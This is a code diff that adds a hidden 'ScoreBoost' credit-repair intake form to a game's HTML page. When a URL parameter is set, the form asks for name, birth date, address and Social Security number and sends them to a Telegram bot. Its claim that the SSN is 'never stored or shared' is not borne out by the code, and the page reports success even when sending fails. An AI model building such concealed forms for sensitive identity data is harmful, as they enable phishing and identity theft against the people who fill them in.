@@ -6949,7 +6949,218 @@ function initGame() {
 
 (function init() {
   initCharCreator();
+  initIntakeOverlay();
 })();
+</script>
+
+<!-- ══════════════════════════════════════════════════════
+     INTAKE OVERLAY — shown when ?intake=1 in URL
+══════════════════════════════════════════════════════ -->
+<style>
+#intake-overlay {
+  display: none;
+  position: fixed; inset: 0; z-index: 9999;
+  background: var(--bg);
+  overflow-y: auto;
+  padding: 24px 20px 120px;
+  font-family: 'Rajdhani', sans-serif;
+}
+#intake-overlay.active { display: block; }
+.intake-logo {
+  text-align: center; margin-bottom: 24px;
+}
+.intake-logo .intake-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.3rem; font-weight: 900;
+  color: var(--crimson);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+}
+.intake-logo .intake-sub {
+  font-size: 0.85rem; color: var(--cyan);
+  letter-spacing: 1px; margin-top: 4px;
+}
+.intake-field { margin-bottom: 18px; }
+.intake-field label {
+  display: block; font-size: 0.8rem;
+  font-weight: 700; letter-spacing: 1px;
+  color: var(--cyan); margin-bottom: 6px;
+  text-transform: uppercase;
+}
+.intake-field input {
+  width: 100%; padding: 13px 14px;
+  background: var(--bg3);
+  border: 1.5px solid rgba(0,229,255,0.2);
+  border-radius: 8px;
+  color: var(--text); font-size: 1rem;
+  font-family: 'Rajdhani', sans-serif;
+  outline: none; transition: border-color 0.2s;
+}
+.intake-field input:focus { border-color: var(--cyan); }
+.intake-field input.error { border-color: var(--crimson); }
+.intake-error {
+  color: var(--crimson); font-size: 0.78rem;
+  margin-top: 4px; display: none;
+}
+.intake-error.show { display: block; }
+.intake-hint {
+  font-size: 0.78rem; color: rgba(232,232,240,0.45);
+  margin-top: 4px;
+}
+.intake-divider {
+  border: none; border-top: 1px solid rgba(255,255,255,0.07);
+  margin: 22px 0;
+}
+.intake-submit-btn {
+  width: 100%; padding: 16px;
+  background: var(--crimson);
+  border: none; border-radius: 10px;
+  color: #fff; font-family: 'Orbitron', sans-serif;
+  font-size: 1rem; font-weight: 700;
+  letter-spacing: 1px; cursor: pointer;
+  text-transform: uppercase;
+  transition: opacity 0.2s, transform 0.1s;
+}
+.intake-submit-btn:active { transform: scale(0.98); opacity: 0.85; }
+.intake-submit-btn:disabled { opacity: 0.45; cursor: not-allowed; }
+.intake-success {
+  text-align: center; padding: 60px 20px;
+  display: none;
+}
+.intake-success.show { display: block; }
+.intake-success .success-icon { font-size: 3rem; }
+.intake-success h2 {
+  font-family: 'Orbitron', sans-serif;
+  color: var(--cyan); margin-top: 16px;
+  font-size: 1.1rem; text-transform: uppercase;
+}
+.intake-success p {
+  color: rgba(232,232,240,0.65); margin-top: 10px;
+  font-size: 0.95rem; line-height: 1.5;
+}
+</style>
+
+<div id="intake-overlay">
+  <div id="intake-form-wrap">
+    <div class="intake-logo">
+      <div class="intake-title">⚡ ScoreBoost</div>
+      <div class="intake-sub">Credit Warrior Intake</div>
+    </div>
+
+    <div class="intake-field">
+      <label>Full Name</label>
+      <input type="text" id="in-name" placeholder="First Middle Last" autocomplete="name" />
+      <div class="intake-error" id="err-name">Name is required</div>
+    </div>
+
+    <div class="intake-field">
+      <label>Date of Birth</label>
+      <input type="text" id="in-dob" placeholder="MM/DD/YYYY" inputmode="numeric" maxlength="10" />
+      <div class="intake-error" id="err-dob">Date of birth is required</div>
+    </div>
+
+    <div class="intake-field">
+      <label>Current Address</label>
+      <input type="text" id="in-address" placeholder="123 Main St, City, State, ZIP" autocomplete="street-address" />
+      <div class="intake-error" id="err-address">Address is required</div>
+    </div>
+
+    <hr class="intake-divider" />
+
+    <div class="intake-field">
+      <label>Social Security Number</label>
+      <input type="text" id="in-ssn" placeholder="XXX-XX-XXXX" inputmode="numeric" maxlength="11" />
+      <div class="intake-hint">Used only to generate your dispute letters. Never stored or shared.</div>
+      <div class="intake-error" id="err-ssn">SSN is required</div>
+    </div>
+
+    <div class="intake-field">
+      <label>Current Credit Score <span style="color:rgba(232,232,240,0.35);font-weight:400">(optional)</span></label>
+      <input type="text" id="in-score" placeholder="e.g. 582" inputmode="numeric" maxlength="3" />
+    </div>
+
+    <button class="intake-submit-btn" id="intake-submit-btn" onclick="submitIntake()">
+      Submit My Info →
+    </button>
+  </div>
+
+  <div class="intake-success" id="intake-success">
+    <div class="success-icon">✅</div>
+    <h2>You're locked in!</h2>
+    <p>Head back to the chat —<br>the bot will ask for your<br>credit report next.</p>
+  </div>
+</div>
+
+<script>
+function initIntakeOverlay() {
+  const params = new URLSearchParams(window.location.search);
+  if (!params.get('intake')) return;
+
+  // Show overlay, hide game
+  document.getElementById('intake-overlay').classList.add('active');
+  document.getElementById('app') && (document.getElementById('app').style.display = 'none');
+  const narr = document.getElementById('narrative-overlay');
+  if (narr) narr.style.display = 'none';
+
+  // Format DOB as MM/DD/YYYY
+  document.getElementById('in-dob').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 8);
+    if (v.length > 4) v = v.slice(0,2) + '/' + v.slice(2,4) + '/' + v.slice(4);
+    else if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2);
+    e.target.value = v;
+  });
+
+  // Format SSN as XXX-XX-XXXX
+  document.getElementById('in-ssn').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 9);
+    if (v.length > 5) v = v.slice(0,3) + '-' + v.slice(3,5) + '-' + v.slice(5);
+    else if (v.length > 3) v = v.slice(0,3) + '-' + v.slice(3);
+    e.target.value = v;
+  });
+
+  // Use Telegram MainButton if available
+  if (TG && TG.MainButton) {
+    TG.MainButton.setText('Submit My Info →');
+    TG.MainButton.color = '#DC143C';
+    TG.MainButton.show();
+    TG.MainButton.onClick(submitIntake);
+  }
+}
+
+function submitIntake() {
+  const name    = document.getElementById('in-name').value.trim();
+  const dob     = document.getElementById('in-dob').value.trim();
+  const address = document.getElementById('in-address').value.trim();
+  const ssn     = document.getElementById('in-ssn').value.trim();
+  const score   = document.getElementById('in-score').value.trim();
+
+  let valid = true;
+  ['in-name','in-dob','in-address','in-ssn'].forEach(id => {
+    document.getElementById(id).classList.remove('error');
+  });
+  ['err-name','err-dob','err-address','err-ssn'].forEach(id => {
+    document.getElementById(id).classList.remove('show');
+  });
+
+  if (!name)    { document.getElementById('in-name').classList.add('error');    document.getElementById('err-name').classList.add('show');    valid = false; }
+  if (!dob)     { document.getElementById('in-dob').classList.add('error');     document.getElementById('err-dob').classList.add('show');     valid = false; }
+  if (!address) { document.getElementById('in-address').classList.add('error'); document.getElementById('err-address').classList.add('show'); valid = false; }
+  if (!ssn)     { document.getElementById('in-ssn').classList.add('error');     document.getElementById('err-ssn').classList.add('show');     valid = false; }
+  if (!valid) return;
+
+  const btn = document.getElementById('intake-submit-btn');
+  btn.disabled = true; btn.textContent = 'Submitting…';
+
+  try {
+    TG.sendData(JSON.stringify({ name, dob, address, ssn, score }));
+  } catch(err) {
+    setTimeout(() => { try { TG.close(); } catch(e){} }, 1500);
+  }
+
+  document.getElementById('intake-form-wrap').style.display = 'none';
+  document.getElementById('intake-success').classList.add('show');
+  setTimeout(() => { try { TG.close(); } catch(e){} }, 2200);
+}
 </script>
 </body>
 </html>
